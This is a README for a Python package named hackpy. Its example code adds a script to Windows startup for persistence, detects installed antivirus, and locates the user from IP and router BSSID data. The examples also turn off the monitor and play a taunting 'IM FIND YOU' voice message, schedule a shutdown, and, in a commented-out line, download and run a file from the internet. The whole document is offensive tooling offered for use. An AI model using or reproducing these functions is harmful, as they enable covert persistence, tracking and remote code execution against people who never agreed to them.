# `pip install hackpy`
![](https://picua.org/images/2019/07/02/a565a62aa7c27eb1339c6cb0be7c9d49.png)

# Example usage:
``` python
import os, sys
import hackpy

PATH = os.path.dirname(os.path.realpath(__file__)) # Get current directory path
CORE = os.path.basename(os.path.realpath(sys.argv[0])) # Get this script filename.

hackpy.clean() # Remove all hackpy temp files from system
hackpy.load(architecture=64) # default it 32

# Autorun
hackpy.autorun(PATH, CORE, 'test', state=True) # Add this file to startup
hackpy.autorun(PATH, CORE, 'test', state=False) # Remove this file from startup

# Detect installed antivirus software on computer:
data = hackpy.detect_protection()
for antivirus in data:
    print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])

# Information about you IP:
data = hackpy.ip_info()
print('[?] - You IP is: ' + data['query'])
print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])

# Information about other IP:
data = hackpy.ip_info('216.58.215.110')
print('[?] - Other Information about IP:\n' + str(data))
# {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}

# Get router bssid:
bssid = hackpy.router() # You can use own router ip list: router_urls = ['192.168.0.1', '192.168.1.1', etc...]
# Find LATITUDE and LONGITUDE with router BSSID:
data = hackpy.bssid_locate()
print('LATITUDE: ' + str(data['lat']) + ', LONGITUDE: ' + str(data['lon']) + ', RANGE: ' + str(data['range']))

# Nircmdc reference: https://nircmd.nirsoft.net
hackpy.nircmdc('monitor off')
hackpy.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
# System commands
hackpy.system('shutdown -s -t 3600')

# Load and execute file from internet
# file = hackpy.wget(direct.link.here)
# hackpy.start(file)
```
